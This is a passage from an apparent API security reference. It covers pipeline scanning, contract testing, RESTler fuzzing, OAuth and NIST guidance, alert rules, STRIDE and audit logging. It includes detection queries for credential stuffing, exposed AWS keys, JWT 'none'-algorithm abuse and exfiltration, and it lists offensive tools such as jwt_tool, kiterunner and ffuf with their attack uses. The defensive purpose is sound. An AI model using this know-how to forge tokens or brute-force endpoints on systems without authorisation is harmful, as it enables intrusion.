# - Sensitive field exposure (passwords, SSNs in responses)
# - Error response information leakage
# - HTTPS enforcement in server URLs
# - Proper HTTP method usage
```

**42Crunch Audit Score:** Endpoints are scored 0-100; scores below 75 indicate critical issues. Common failures:
- Missing `minLength`/`maxLength` on string parameters
- No schema defined for request bodies
- Missing authentication on endpoints
- 500 error responses not defined (unexpected error leakage)

### DAST for APIs in Pipeline

**OWASP ZAP API Scan:**
```yaml
# GitHub Actions: ZAP API scan
- name: ZAP API Scan
  uses: zaproxy/action-api-scan@v0.7.0
  with:
    target: 'https://staging-api.example.com'
    format: openapi
    api_file: './openapi.yaml'
    fail_action: true
    cmd_options: '-config globalconf.delay=500 -config globalconf.requestsPerHost=5'
```

```bash
# ZAP API scan via Docker
docker run -v $(pwd):/zap/wrk/:rw   -t ghcr.io/zaproxy/zaproxy:stable   zap-api-scan.py   -t https://staging-api.example.com   -f openapi   -I   -r api_scan_report.html   -J api_scan_report.json
```

**Akto CI Integration:**
```yaml
# Akto security scan in GitHub Actions
- name: Akto API Security Scan
  uses: akto-api-security/run-scan@v1.0.5
  with:
    AKTO_DASHBOARD_URL: ${{ secrets.AKTO_URL }}
    AKTO_API_KEY: ${{ secrets.AKTO_KEY }}
    AKTO_TEST_IDS: >-
      BOLA_BROKEN_OBJECT_LEVEL_AUTHORIZATION,
      BROKEN_AUTHENTICATION,
      MASS_ASSIGNMENT,
      RATE_LIMITING
    START_TIME_DELAY: 120
```

### Contract Testing with Pact

Consumer-driven contract testing ensures API changes don't break consumers:

```javascript
// Consumer: define expected API contract (Pact)
const { PactV3, MatchersV3 } = require('@pact-foundation/pact');

const provider = new PactV3({
  consumer: 'frontend-app',
  provider: 'user-api',
});

describe('User API', () => {
  it('returns user data', async () => {
    await provider
      .given('user 1042 exists')
      .uponReceiving('a request for user profile')
      .withRequest({
        method: 'GET',
        path: '/api/v1/users/1042',
        headers: { Authorization: MatchersV3.regex(/^Bearer .+/, 'Bearer token') }
      })
      .willRespondWith({
        status: 200,
        body: {
          id: MatchersV3.integer(1042),
          email: MatchersV3.email('user@example.com'),
          name: MatchersV3.string('Alice'),
          // Security: NOT including sensitive fields in contract
        }
      })
      .executeTest(async (mockServer) => {
        const response = await api.getUser(1042);
        expect(response.data).not.toHaveProperty('password_hash');
        expect(response.data).not.toHaveProperty('ssn');
      });
  });
});
```

**Security value of contract testing:**
- Documents which fields are expected in API responses
- Detects when sensitive fields are accidentally added to responses
- Catches breaking changes to authentication requirements
- Validates error response formats

### RESTler — Stateful REST API Fuzzing

**RESTler** (Microsoft Research) is the first stateful REST API fuzzer. It analyzes OpenAPI specs and generates test sequences that chain multiple API calls:

```bash
# Install RESTler
docker pull mcr.microsoft.com/restler:latest

# Compile OpenAPI spec into RESTler grammar
docker run -v $(pwd):/src mcr.microsoft.com/restler:latest   dotnet /RESTler/restler/Restler.dll compile   --api_spec /src/openapi.yaml

# Fuzz mode: stateful fuzzing
docker run -v $(pwd):/src mcr.microsoft.com/restler:latest   dotnet /RESTler/restler/Restler.dll fuzz   --grammar_file /src/Compile/grammar.py   --dictionary_file /src/Compile/dict.json   --settings /src/engine_settings.json   --no_ssl   --target_ip staging-api.example.com   --target_port 8080   --time_budget 1.0  # hours

# RESTler automatically:
# - Creates resources then reads/updates/deletes them
# - Checks for 500 errors (unexpected server errors)
# - Tests resource cleanup (can you access deleted resources?)
# - Tests invalid state transitions
```

**RESTler finds:**
- Use-after-delete (zombie object access)
- Race conditions in resource creation
- Inconsistent state handling
- Input validation bypasses via chained requests

### API Change Detection

```yaml
# openapi-diff in CI pipeline
- name: Detect Breaking API Changes
  run: |
    # Compare current spec against main branch spec
    docker run --rm       -v $(pwd):/specs       openapitools/openapi-diff:latest         /specs/openapi-main.yaml         /specs/openapi-current.yaml         --fail-on-incompatible         --html /specs/api-diff-report.html

    # Breaking changes that fail the build:
    # - Removing endpoints
    # - Removing required request fields
    # - Adding required response fields
    # - Changing authentication requirements
    # - Narrowing response schemas (removing fields consumers depend on)
```

### API Versioning Security Implications

| Versioning Strategy | Security Risk | Mitigation |
|--------------------|---------------|------------|
| **URL versioning** (`/v1/`, `/v2/`) | Zombie endpoints (v1 still live) | Hard sunset v1 after 6 months; gate v1 access |
| **Header versioning** (`API-Version: 2`) | Version stripping attacks (omit header → old behavior) | Default to most secure version, not oldest |
| **Query param versioning** (`?version=2`) | Parameter logged in access logs | Prefer header or URL versioning |
| **Subdomain versioning** (`v2.api.example.com`) | Certificate/WAF config drift between subdomains | Unified gateway for all versions |

**Security rule:** New API versions must be at least as secure as deprecated versions. Never relax security constraints in a new version to maintain backward compatibility.

---

## 10. API Security Standards and Monitoring

### NIST SP 800-204 Series

NIST Special Publication 800-204 covers security for microservice-based applications, with significant API-specific guidance:

**SP 800-204A:** Building Secure Microservices-based Applications Using Service-Mesh Architecture
- Service mesh as security enforcement layer (Istio, Linkerd)
- mTLS between all services by default
- Authorization policies at sidecar proxy level

**SP 800-204B:** Attribute-based Access Control for Microservices-based Applications Using a Service Mesh
- ABAC (Attribute-Based Access Control) implementation
- Policy decision point (PDP) vs. policy enforcement point (PEP) separation
- JWT claim-based authorization in service mesh

**SP 800-204C:** Implementation of DevSecOps for a Microservices-based Application with Service Mesh
- Security pipeline integration requirements
- SAST, DAST, SCA for API services
- Container image scanning, Kubernetes admission control

**SP 800-204D:** Strategies and Guidance for Securing Application Programming Interfaces (APIs)
- API inventory and governance requirements
- Authentication and authorization patterns
- API gateway as security control plane
- Logging and monitoring requirements

### OAuth 2.0 Security Best Current Practice (RFC 9700)

RFC 9700 (2024, updates RFC 6749) documents current OAuth 2.0 security best practices:

**Key requirements:**
- **PKCE mandatory** for all authorization code flows (including confidential clients)
- **Exact redirect URI matching** — no pattern matching, wildcards prohibited
- **State parameter** required for CSRF protection in all flows
- **Access token binding** — sender-constrained tokens (mTLS certificate binding, DPoP)
- **Refresh token rotation** — each use issues new refresh token, old one invalidated
- **Token lifetime limits** — access tokens: max 5 minutes for high-value operations
- **Implicit grant flow deprecated** — do not use
- **Resource Owner Password Credentials flow deprecated** — do not use

**DPoP (Demonstrating Proof of Possession) — RFC 9449:**
```http
POST /token HTTP/1.1
DPoP: eyJhbGciOiJFUzI1NiIsInR5cCI6ImRwb3Arand...
# DPoP proof is a JWT signed with client's private key
# Server validates proof → token is bound to client's key pair
# Stolen token unusable without client's private key
```

### OpenAPI Security Schemes Specification

```yaml
# OpenAPI 3.1 complete security scheme definitions
components:
  securitySchemes:

    # HTTP Bearer (JWT)
    BearerAuth:
      type: http
      scheme: bearer
      bearerFormat: JWT

    # API Key in header
    ApiKeyHeader:
      type: apiKey
      in: header
      name: X-API-Key

    # OAuth 2.0 with all flows
    OAuth2:
      type: oauth2
      flows:
        clientCredentials:
          tokenUrl: https://auth.example.com/token
          scopes:
            read: Read access
            write: Write access
        authorizationCode:
          authorizationUrl: https://auth.example.com/authorize
          tokenUrl: https://auth.example.com/token
          pkce: required  # OAS 3.1 PKCE support
          scopes:
            openid: OpenID Connect
            profile: User profile

    # Mutual TLS
    MutualTLS:
      type: mutualTLS
```

### API Runtime Monitoring — Anomaly Detection

**Metrics to monitor:**
```yaml
# Prometheus metrics for API anomaly detection
api_requests_total{method, endpoint, status_code, user_id}
api_request_duration_seconds{endpoint}
api_auth_failures_total{endpoint, failure_reason}
api_rate_limit_hits_total{endpoint, user_id, limit_type}
api_data_volume_bytes{endpoint, direction}  # Unusual data exfiltration
```

**Alert rules:**
```yaml
# Grafana/Prometheus alerting rules
groups:
  - name: api_security
    rules:

    # Authentication failure spike
    - alert: APIAuthFailureSpike
      expr: |
        rate(api_auth_failures_total[5m]) > 10
      labels:
        severity: warning
      annotations:
        summary: "High API authentication failure rate — possible credential stuffing"

    # Unusual endpoint access (BOLA probing)
    - alert: UnusualEndpointEnumeration
      expr: |
        increase(api_requests_total{status_code="403"}[1m]) > 50
      labels:
        severity: warning
      annotations:
        summary: "High rate of 403 responses — possible BOLA/authorization probing"

    # Data volume spike (possible exfiltration)
    - alert: APIDataExfiltrationSuspect
      expr: |
        rate(api_data_volume_bytes{direction="outbound"}[5m])
        > 3 * avg_over_time(api_data_volume_bytes{direction="outbound"}[1h])
      labels:
        severity: critical
      annotations:
        summary: "API outbound data volume 3x above baseline — investigate for exfiltration"

    # New endpoint discovered (shadow API)
    - alert: UnregisteredEndpointAccess
      expr: |
        api_requests_total{registered="false"} > 0
      labels:
        severity: high
      annotations:
        summary: "Request to unregistered API endpoint — shadow API detected"
```

### API Threat Modeling — STRIDE for APIs

Applying STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) to API endpoints:

| STRIDE Threat | API Manifestation | Control |
|--------------|-------------------|---------|
| **Spoofing** | Token theft, JWT forgery, API key leakage | Strong auth, token binding, key rotation |
| **Tampering** | Request body modification, parameter injection | Input validation, request signing (HMAC) |
| **Repudiation** | Missing audit trail for sensitive operations | Comprehensive audit logging with user ID |
| **Information Disclosure** | BOLA, excessive data exposure, verbose errors | Object-level authz, response filtering, generic errors |
| **Denial of Service** | Resource exhaustion, large payloads, expensive queries | Rate limiting, payload limits, query complexity limits |
| **Elevation of Privilege** | BFLA, mass assignment, JWT claim manipulation | RBAC enforcement, explicit allowlists, JWT validation |

**API threat model data flow diagram elements:**
1. **External API Consumer** (mobile app, web SPA, third-party)
2. **API Gateway** (rate limiting, auth validation, WAF)
3. **API Service** (business logic, authorization)
4. **Data Store** (database, cache, object storage)
5. **External Service** (third-party API, payment processor)

Trust boundaries: External→Gateway, Gateway→Service, Service→DataStore

### Audit Logging Requirements

**PCI DSS v4.0 — API Audit Requirements:**
- Log all access to cardholder data via APIs (Requirement 10.2)
- Capture: user ID, date/time, action type, object accessed, originating IP
- Log failures: failed authentication, privilege escalation attempts
- Tamper-evident logs: write-once storage, integrity monitoring
- Retention: 12 months minimum, 3 months immediately available

**HIPAA — API Audit for PHI:**
- Audit controls for all ePHI access via APIs (§164.312(b))
- Log who accessed what PHI, when, and from where
- Activity review: regularly review API logs for suspicious access patterns
- Retention: 6 years minimum

**SOC 2 Type II — API Logging for CC7:**
- Log authentication events (success/failure) for all API calls
- Monitor for unauthorized access attempts
- Alert on anomalous access patterns
- Evidence of log review for audit

**Structured audit log format:**
```json
{
  "timestamp": "2025-04-26T14:23:01.234Z",
  "event_type": "api_access",
  "request_id": "req-abc123",
  "user_id": "usr-1042",
  "client_id": "mobile-app-v3",
  "source_ip": "203.0.113.45",
  "method": "GET",
  "endpoint": "/api/v1/patients/789/records",
  "resource_type": "patient_record",
  "resource_id": "789",
  "status_code": 200,
  "duration_ms": 45,
  "data_returned_bytes": 2340,
  "auth_type": "bearer_jwt",
  "scopes": ["read:patient_records"],
  "risk_score": 0.2
}
```

### MITRE ATT&CK — API-Relevant Techniques

| Technique | ID | API Context | Detection Query |
|-----------|-----|------------|-----------------|
| **Exploit Public-Facing Application** | T1190 | OWASP API Top 10 exploitation | `status_code:500 AND endpoint:/api/ count > 10/min` |
| **Network Service Discovery** | T1046 | API endpoint enumeration, port scanning | `status_code:404 AND unique_endpoints > 100/min/ip` |
| **Valid Accounts** | T1078 | Credential stuffing, stolen JWT reuse | `auth_failures > 50/min OR token_reuse_different_ip` |
| **Unsecured Credentials** | T1552 | API keys in git, environment variable exposure | `response_body contains /AKIA[A-Z0-9]{16}/` |
| **Data from Cloud Storage** | T1530 | Misconfigured API exposing cloud storage | `endpoint:/presigned-url OR /s3/ AND data_bytes > 1MB` |
| **Exfiltration Over Web Service** | T1567 | Large data export via API | `outbound_bytes > 10MB AND endpoint:/export/` |

**API-Specific ATT&CK Detection Queries (Elasticsearch/Splunk):**

```
# Credential stuffing detection (Splunk)
index=api_logs auth_event=failure
| stats count by src_ip, user_agent
| where count > 100
| eval risk="credential_stuffing"

# BOLA enumeration detection (Elasticsearch)
{
  "query": {
    "bool": {
      "must": [
        {"term": {"status_code": 403}},
        {"range": {"timestamp": {"gte": "now-5m"}}}
      ]
    }
  },
  "aggs": {
    "by_user": {
      "terms": {"field": "user_id"},
      "aggs": {
        "unique_resources": {"cardinality": {"field": "resource_id"}}
      }
    }
  }
}
# Alert when unique_resources > 50 for single user in 5 minutes

# JWT algorithm confusion detection (Sumo Logic)
_sourceCategory=api/auth
| json field=_raw "jwt_header.alg" as alg
| where alg in ("none", "HS256") and expected_alg="RS256"
| alert

# Shadow API detection (any SIEM)
api_requests
| join registered_endpoints on endpoint
| where registered_endpoints.endpoint is null
| alert "Unregistered API endpoint accessed"
```

### API Security Tooling Summary

| Tool | Category | Key Use Case |
|------|----------|--------------|
| **Postman** | Testing client | Manual API testing, collection-based automation |
| **Insomnia** | Testing client | Open-source REST/GraphQL/gRPC testing |
| **Burp Suite Pro** | Proxy/scanner | Intercept, modify, replay API requests; active scanning |
| **ZAP** | DAST | Open-source automated API vulnerability scanning |
| **jwt_tool** | JWT | JWT vulnerability testing (none alg, confusion, brute force) |
| **Arjun** | Discovery | Hidden parameter discovery for API endpoints |
| **kiterunner** | Discovery | API route brute forcing with curated wordlists |
| **ffuf** | Fuzzing | Fast web fuzzer for endpoint and parameter discovery |
| **RESTler** | Fuzzing | Stateful REST API fuzzing from OpenAPI spec |
| **graphql-cop** | GraphQL | GraphQL security audit (introspection, batching, depth) |
| **InQL** | GraphQL | GraphQL query generation and Burp integration |
| **grpcurl** | gRPC | gRPC service enumeration and reflection testing |
| **Akto** | Platform | Full API security platform: discovery, testing, CI/CD |
| **42Crunch** | Linting | OpenAPI spec security audit and scoring |
| **Spectral** | Linting | OpenAPI/AsyncAPI security rule linting |
| **truffleHog** | Secrets | API key and secret scanning in git history |
| **nuclei** | Scanner | Template-based API vulnerability scanning |

---

*Reference compiled for cybersecurity practitioners. All techniques described for authorized security testing and defensive purposes only. Always obtain proper authorization before conducting security testing.*

*Last updated: 2026-04-26*
